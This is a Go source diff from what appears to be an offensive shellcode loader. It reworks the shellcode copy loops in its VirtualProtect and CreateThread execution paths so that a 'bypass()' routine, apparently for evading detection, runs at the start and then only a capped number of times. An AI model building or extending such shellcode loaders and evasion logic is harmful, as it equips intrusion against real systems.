@@ -12,12 +12,6 @@ import (
 	"project/internal/random"
 )
 
-// supported execute methods
-const (
-	MethodVirtualProtect = "vp"
-	MethodCreateThread   = "thread"
-)
-
 // Execute is used to execute shellcode, default method is VirtualProtect,.
 // It will block until shellcode return.
 // warning: shellcode slice will be covered.
@@ -106,14 +100,19 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// copy shellcode
+	bypass()
 	rand := random.NewRand()
 	count := 0
+	total := 0
 	for i := 0; i < l; i++ {
-		if count > scheduleCount {
-			bypass()
-			count = 0
-		} else {
-			count++
+		if total < maxBypassTimes {
+			if count > criticalValue {
+				bypass()
+				count = 0
+				total++
+			} else {
+				count++
+			}
 		}
 		// set shellcode
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
@@ -232,14 +231,19 @@ func CreateThread(shellcode []byte) error {
 	}
 
 	// copy shellcode
+	bypass()
 	rand := random.NewRand()
 	count := 0
+	total := 0
 	for i := 0; i < l; i++ {
-		if count > scheduleCount {
-			bypass()
-			count = 0
-		} else {
-			count++
+		if total < maxBypassTimes {
+			if count > criticalValue {
+				bypass()
+				count = 0
+				total++
+			} else {
+				count++
+			}
 		}
 		// set shellcode
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
